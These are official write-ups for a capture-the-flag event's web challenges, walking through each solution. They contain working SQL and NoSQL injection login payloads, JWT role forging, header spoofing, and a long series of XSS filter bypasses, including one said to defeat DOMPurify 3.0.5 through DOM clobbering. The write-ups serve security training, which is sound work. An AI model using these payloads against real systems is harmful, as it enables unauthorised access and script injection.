# Official Writeups for (some of) the challenges of the Interlogica Code in the Dark CTF

##	Unbreakable secret
The secret code is `I-t0lD-Y0u-thAt-Th1s-P4s5Cod3-w4s-Unbr3ak4bl3`, which is obviously unbreakable.
When we open the browser dev tools, we see that it checks if the md5 of the given secret code matches the value `e4b61663a82f28ccf0594376d69b5d95` and, if so, passes that value to the `showFlag` function.

So to solve the challenge, we just need to invoke the `showFlag` from the dev tools with the existing md5 visible in the source code:

    showFlag('e4b61663a82f28ccf0594376d69b5d95')

## The Bl0g

After a successful registration we can see the post from the admin.

The user `brutilde` has her password (`-POST-ITS-`) in a post-it visible in her the profile image.

Once logged in as `brutilde`, the source code of the application becomes available via link.

By inspecting the source code we can now get to know that upon registration, we can create an admin user by adding the field `role=admin` to the `POST /register` request.

The flag will be visible in the `/administration` page.

## Snobby H4ck3r

The login page is vulnerable to SQL injection attacks.

The username `' OR '1'='1' --` successfully logs in as a normal user, but in order to access the `/administration` page the challenger needs admin rights.

The username `' OR '1'='1' LIMIT 1 OFFSET 1 --` skips the first user in the `users` table and gets the second one, which has the admin role.

Upon login with a user with the admin role, the flag is displayed.

## AREA7331-1

From the `Secret Mission.pdf` file we get an email/password pair that we can use to log in as Kevin Johnson in the platform.

From the `Your information.pdf` document we can see the structure of the default password issued to new employees.

From the `My notes.pdf` file we can see that there is a user with employee ID `EID004075` who is called Mark. The surname will turn out to be Gordon.

By leveraging the weak reset password feature we can guess the value of Mark Gordon's password after a reset.

From his `Voice notes transcript.pdf` we can recover the full name of the head of research (David Gillian) as well as guess his ID, since it's mentioned that he's the seventh employee ever within the company (thus has ID `EID000007`)

We can then reset his password and access with his account. The flag is hidden in the `Research results.pdf` document and can be copied from the document and pasted to reveal its value.

## AREA7331-2: Going Nuclear

The photo of the badge contains the first name, last name and ID of the network administrator. We can go back to the AREA7331-1 challenge and reset his account to access his documents.

From there we get to know that the `fw-admin-1.area7331.lab` machine exists. It will be obvious that the password will be `rufus`.

Once connected to that machine, we can disable the first level firewall and, from the healthcheck page, we can get to know that the `fw-admin-2.area7331.lab` machine also exists.

Once this second firewall (which has the same credentials) is disabled, we can access the following machines:

	cameras.area7331.lab
	speakers.area7331.lab
	reactor-subsystems.area7331.lab
	reactor-main.area7331.lab

We can gain access to `cameras.area7331.lab` and `speakers.area7331.lab` via SQL injection by using `' OR 1--` as password.

We can now activate the alarm or blast rickroll on the speakers: after some seconds Jim will login to disable the speakers.
He will make a typo while logging in: this event will be logged in the `fw-admin-2.area7331.lab` logs.
His credentials will then be obvious: `jwhite/iloveyou`. Such credentials can then be used to also access `reactor-subsystems.area7331.lab` and `reactor-main.area7331.lab`.

Once the main cooling pumps and the backup cooling pumps are disabled and once the reactor is set to overdrive, the reactor explodes and the flag is returned.

## AREA7331-3: OUTBREAK

Upon viewing the login page, we can infer from the `X-Powered-By` header that the application is running a mongodb
database.
A NoSQL injection is possible and the following payload lets us in the application:

    {"username":{"$ne":""},"password":{"$ne":""}}

We then log in as `hpowell` with a clearance level of 1.

From the `pageId` query parameter we can infer that some other pages exist: in this case we can see that a page with id
3 exists, but a clearance level of 2 is required to access it. Also a page with id 4 exists with a minimum clearance
level of 3.

We can modify the NoSQL injection as follows in order to log in with a clearance level 2 account:

    {"username":{"$ne":"hpowell"},"password":{"$ne":""}}

We then log in as `dmartensen` with a clearance level of 2.

We can now access the logs page (`pageId=3`) and from the logs we can find another username: `eyugens`.

We can again modify the NoSQL injection as follows in order to log in as that user:

    {"username":{"$eq":"eyugens"},"password":{"$ne":""}}

We are now logged in as `eyugens` with a clearance level of 3, and we have access to the specimens monitor
page (`pageId=4`).

From the source code of the page we can see that a page with id `133333333337` exists: that page is the one that we have
to use to neutralize the specimens.

In order to bypass the local access limitation, we have to change the `Origin` or the `Referer` headers to `localhost`
in the request that is sent upon neutralization confirmation.

We are then shown the flag.

## AREA7331: DRONES

The vulnerable test credentials need to be guessed (brute-forced) and are: `test/12345678`.
Once logged in, a jtw token is given to the browser.
When we access the `/codebase` page we are shown an error that says that we do not have the necessary `devops` role.

By dir-busting the application we can see that a `robots.txt` is present with a `Disallow: /backup` entry.

That folder can be dir-busted in order to find out about the existence of a `.env` file:
a secret can be seen in it: it's the secret used by the server to sign the jwt tokens.

The current jwt token can then be manipulated and then signed again (for example by using jwt.io):
the goal is to change the `role` claim from `user` to `devops`.

The `/codebase` becomes now accessible and the code and backups can now be deleted.

The only thing missing to do is uploading the firmware. We can see from the disabled `Upload new firmware` button in the `/codebase` page that a `/firmware-upload` page exists.
That page has a soft-redirect back to `/codebase`.
From its content (invisible from the browser, but visible from other tools such as curl or burp) we can see that a form with a file upload can be found.

We need to upload the firmware file using that form. Once the file is uploaded, the flag is returned.

## Collision course!

The hashing function is very vulnerable. An idea is to create a 8 characters long string and changing characters to match each byte from the hash, one at a time.
Each byte changes when a character at index `n` and `length-n` is changed.
Valid strings are:

    Baegz8<8
    Caegz8<9
    Caehu8<9

## eXSStravaganza level 1
### The sanitizer

    function sanitize(input) {
        // warmup
        return input;
    }

### The solution

As simple as that

    <script>alert(1)</script>

## eXSStravaganza level 2
### The sanitizer

    function sanitize(input) {
        // no scripts!
        if (input.toLowerCase().includes('script')) {
            return 'NO!';
        }
        return input;
    }

### The solution

Just use another tag

    <img src=x onerror=alert(1)>

## eXSStravaganza level 3
### The sanitizer

    function sanitize(input) {
        // no alert!
        if (input.toLowerCase().includes('alert')) {
            return 'NO!';
        }
        return input;
    }

### The solution

We can use the octal notation to obfuscate the `alert` string

    <script>window['\141lert'](1)</script>

## eXSStravaganza level 4
### The sanitizer

    function sanitize(input) {
        // uppercase! how r ya gonna call that alert?
        return input.toUpperCase();
    }

### The solution

As https://jsfuck.com teaches, we can write everything without using the alphabet. This however is a shorter variation that leverages octal encoding:

    <script>[]['\155\141\160']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()</script>

## eXSStravaganza level 5
### The sanitizer

    function sanitize(input) {
        // no equals, no parentheses!
        return input.replace(/[=(]/g, '');
    }

### The solution

ES6 sugar!

    <script>eval.call`${'alert\0501\051'}`</script>

## eXSStravaganza level 6
### The sanitizer

    function sanitize(input) {
        // no symbols whatsoever! good luck!
        const sanitized = input.replace(/[[|\s+*/<>\\&^:;=`'~!%-]/g, '');
        return "  \x3Cscript\x3E\nvar name=\"" + sanitized + "\";\ndocument.body.innerText=name;\n  \x3C/script\x3E";
    }

### The solution

This payload does not trigger syntax errors. It only triggers a runtime error, but after our code gets executed:

    "(alert(1))in"

## eXSStravaganza level 7
### The sanitizer

    function sanitize(input) {
        // no tags, no comments, no string escapes and no new lines
        const sanitized = input.replace(/[</'\r\n]/g, '');
        return "  \x3Cscript\x3E\n// the input is '" + sanitized + "'\n  \x3C/script\x3E";
    }

### The solution

We can go to the next line with a line separator (U+2028) or a paragraph separator (U+2029). Then we can open another comment with `-->` to fix the syntax

     alert(1) -->

## eXSStravaganza level 8
### The sanitizer

    function sanitize(input) {
        let sanitized = input;
        do{
            input = sanitized;
            // no opening tags
            sanitized = input.replace(/<[a-zA-Z]/g, '')
        } while (input != sanitized)
        sanitized = sanitized.toUpperCase();
        do{
            input = sanitized;
            // no script
            sanitized = input.replace(/SCRIPT/g, '')
        } while (input != sanitized)
        return sanitized.toLowerCase();
    }

### The solution

`ı` character for the win, since when set to uppercase it becomes the character `I`

    <ımg src=x onerror=alert(1)>

## eXSStravaganza level 9
### The sanitizer

    function sanitize(input) {
        // no tags, no comments, no string escapes and no new lines
        const sanitized = input.replace(/[a-z\\]/gi, '').substring(0,140);
        return "  \x3Cscript\x3E\n  " + sanitized + "\n  \x3C/script\x3E";
    }

### The solution

We can leverage the letters that we get from some predefined strings:

    ''+!!'' // false
    ''+!'' // true
    ''+!!''+!'' // falsetrue
    []['at'] + '' // function at() { [native code] }

Also we can create variables with non-alphanumeric names such as `à`, `ì`, `ò`

We can join what we have to create the following string:

    []['at']['constructor']('alert(1)')()

One possible resulting payload is:

    à=''+!!''+!'',ì=[][à[1]+à[5]]+à,ù=à[1]+à[2]+à[4]+à[6]+à[5]+'(1)',ò=ì[3]+ì[6]+ì[2]+à[3]+à[5]+à[6]+à[7]+ì[3]+à[5]+ì[6]+à[6],(_=>1)[ò](ù)()

This is not the only payload. The shortest known payload is 97 characters long and is the following:

    ([,하,,,,훌]=[]+{},[한,글,페,이,,로,드,ㅋ,,,ㅎ]=[!!하]+!하+하.ㅁ)[훌+=하+ㅎ+ㅋ+한+글+페+훌+한+하+글][훌](로+드+이+글+한+'(1)')()

## eXSStravaganza level 10
### The sanitizer

    function sanitize(input) {
        // sanitization!
        const sanitized = input
            .replace(/[<>="&%$#\\/]/g, '')
            .split('\n')
            .map(row => 'eval(sanitizeAgainAgain(sanitizeAgain("' + row + '")))')
            .join('\n');
        return '  \x3Cscript>\n' + sanitized + '\n  \x3C/script>'
    }

    var bad = ['<', '>', '&', '%', '$', '#', '[', ']', '|', '{', '}', ';', '\\', '/', ',', '"', '\'', '=', '`', '(', ')'];

    function sanitizeAgain(input) {
        // more sanitization!
        const sanitized = input.split('').filter(c => !bad.includes(c)).join('');
        return sanitized;
    }

    var regex = /[^A-z.\-]/g

    function sanitizeAgainAgain(input) {
        // even more sanitization!
        const sanitized = input.replace(regex, '');
        return sanitized;
    }

### The solution

We can leverage the fact that each line is evaluated at different times and that the function
`sanitizeAgain` has a `bad` character array and that `sanitizeAgainAgain` has a malformed regex
(the alphabetic characters check is flawed and allows the following characters to pass through:

    [\]^_`

In order to break the `sanitizeAgain` function we just have to shorten the `bad` array by calling `bad.length--`, then we can use the backtick character to overwrite the regex in order to break the `sanitizeAgainAgain` function.

The final payload is:

    bad.length--
    bad.length--
    bad.length--
    regex.compile``
    alert(1)

Other solutions are however viable: the regex can be broken with `regex--` as well, so this payload also works:

    regex--
    bad.length--
    bad.length--
    alert(1)

## eXSStravaganza bonus level 1
### The sanitizer

    function sanitize(input) {
        // only letters and some other characters
        const sanitized = input
            .replace(/[^a-z"+,:.=]/g, '')
        return '  \x3Cscript>\nvar x = "' + sanitized + '";\n  \x3C/script>'
    }

### The solution

Almost no useful characters are available, BUT a keen eye can see that the window title of the sandbox is different.
In this case, the window title is in fact `alert(1) // to win!`, which is perfectly valid javascript code.

Keeping this in mind, we can use the following payload to trigger the alert:

    ",location="javascript:"+document.title+"

## eXSStravaganza bonus level 2
### The sanitizer

    function sanitize(input) {
        // no bad chars
        const sanitized = input
            .replace(/[-&%!/#;]/g, '')
        const template = document.createElement('template');
        template.innerHTML = sanitized;
        return '  <!-- ' + template.innerHTML + ' -->'
    }

### The solution

We need to close the comment somehow.
When browsers see a tag starting with a question mark (`<?php>`, for example),
they mutate the html in order to comment it out, so it becomes `<-- <?php> -->`, but as we know comments cannot be nested.

For this reason, the following payloads works:

    <?php><img src=x onerror=alert(1)>
    <?><script>alert(1)

## eXSStravaganza bonus level 3
### The sanitizer

    async function sanitize(input) {
        // let's use DOMPurify 3.0.5!
        const sanitized = await DOMPurify.sanitize(input);
        setTimeout(notifySanitizationCompleted, 100);
        return sanitized;
    }

    function notifySanitizationCompleted() {
        setTimeout(sanitizationCompleted, 100);
    }

### The solution

We need to make use of DOM Clobbering.

The code calls a function called `sanitizationCompleted`, which does not exist.

With DOM Clobbering we can create an element with that value as id in order to make it accessible.

DOMPurify filters `javascript:`, but not `tel:`, as it is deemed secure. It's not.

So the final payload is:

    <a id="sanitizationCompleted" href="tel:alert(1)">

